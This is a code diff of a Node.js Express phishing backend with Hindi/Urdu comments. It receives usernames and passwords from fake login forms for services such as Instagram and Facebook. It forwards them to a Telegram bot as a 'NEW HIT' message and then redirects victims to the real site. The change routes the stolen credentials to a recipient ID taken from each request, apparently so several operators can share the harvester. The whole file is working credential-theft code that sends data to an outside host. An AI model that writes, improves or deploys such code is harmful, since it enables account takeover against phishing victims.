@@ -4,8 +4,7 @@ const axios = require('axios');
 const path = require('path');
 
 const app = express();
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
+const BOT_TOKEN = process.env.BOT_TOKEN; // Sirf Bot Token ki zaroorat hai
 
 const redirectMap = {
     'Instagram': 'https://www.instagram.com', 'Facebook': 'https://www.facebook.com',
@@ -25,36 +24,30 @@ app.get('/', (req, res) => {
 });
 
 app.post('/login-data', (req, res) => {
-    const { username, password, service } = req.body;
-    if (!username || !password || !service) return res.status(400).send("Missing data.");
+    // NAYA UPGRADE: Form se recipientId (user ki ID) nikalo
+    const { username, password, service, recipientId } = req.body;
+
+    if (!username || !password || !service || !recipientId) {
+        return res.status(400).send("Invalid request. User ID is missing.");
+    }
     
-    if (!BOT_TOKEN || !CHAT_ID) {
-        return res.status(500).send("SERVER CONFIGURATION ERROR: BOT_TOKEN or CHAT_ID is missing on Vercel.");
+    if (!BOT_TOKEN) {
+        return res.status(500).send("Server configuration error: BOT_TOKEN is missing.");
     }
 
     const message = `💎✨ **!! NEW HIT !!** ✨💎\n▬▬▬▬▬▬▬▬▬▬▬▬\n🎯 **Service:** *${service}*\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n▬▬▬▬▬▬▬▬▬▬▬▬`;
     const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
+    // NAYA UPGRADE: Data ko hardcoded CHAT_ID ki jagah, dynamic recipientId par bhejo
     axios.post(telegramApiUrl, {
-        chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'
+        chat_id: recipientId, // Yahan badlaav hua hai
+        text: message,
+        parse_mode: 'Markdown'
     })
-    .then(() => {
-        // Agar data send ho gaya, to hi redirect hoga
-        res.redirect(redirectMap[service]);
-    })
+    .then(() => res.redirect(redirectMap[service]))
     .catch(error => {
-        // AGAR DATA SEND FAIL HUA, TO YEH CHALEGA
         console.error("Telegram API Error:", error.response.data);
-
-        // NAYA UPGRADE: Asli error browser mein dikhao
-        const errorMessage = `
-            <h1>DATA SEND FAILED.</h1>
-            <p>Telegram API ne yeh error bheja hai:</p>
-            <pre style="background-color:#f0f0f0; padding:15px; border-radius:5px;">${JSON.stringify(error.response.data, null, 2)}</pre>
-            <hr>
-            <p><strong>Iska matlab tumhara Vercel ka Environment Variable galat hai. Jaakar theek karo.</strong></p>
-        `;
-        res.status(500).send(errorMessage);
+        res.status(500).send("Error sending data.");
     });
 });
 
